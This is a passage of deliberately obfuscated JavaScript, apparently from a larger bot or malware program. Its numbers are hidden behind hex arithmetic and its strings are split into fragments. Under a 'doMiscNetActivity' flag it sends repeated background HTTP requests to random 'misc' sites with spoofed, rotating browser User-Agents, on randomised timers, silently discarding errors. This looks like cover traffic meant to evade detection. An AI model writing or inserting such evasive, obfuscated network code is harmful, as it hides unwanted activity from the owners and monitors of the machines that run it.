      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x2 * -0xb8 + -0x59 * 0xd + -0x1 * -0x315; k < 0x2 * -0x11ff + 0x3 * -0xb83 + -0x468b * -0x1; k++)
    setTimeout(f, (0xd * 0x118 + 0xff + 0xdb29) * k * getRandomInt(-0x213c + 0x2041 * -0x1 + 0x53 * 0xca, -0x202f + 0x903 + 0x172f));
  setInterval(() => {
    f();
    for (let l = 0x31f + 0xe9e * -0x2 + -0x539 * -0x5; l < 0x61 * 0x3b + 0x1084 + -0x157 * 0x1d; l++)
      setTimeout(f, (-0x18b65 + 0x2 * 0xc80 + 0x25cc5 * 0x1) * l * getRandomInt(0x18aa + 0x160b + -0x2eb4, 0x2 * -0x4ff + 0x21a * -0x3 + 0x1 * 0x104f));
  }, -0x5 * -0x977af + 0x1 * 0x62ac5e + -0x283 * 0x2443);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const a2 = c,
    f = axios['create']({
      'headers': {
        'User-Agent': userAgents[a2(0x14)]()
      }
    });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x4 * 0x557 + 0x8 * 0x2d4 + -0x10a4) * getRandomInt(-0x22cb + -0x248c * -0x1 + 0x8 * -0x38, -0xcd * 0x2b + -0x65 * 0x10 + 0x28c4));
}, -0x96f + 0x4ea + 0x1 * 0x4e9);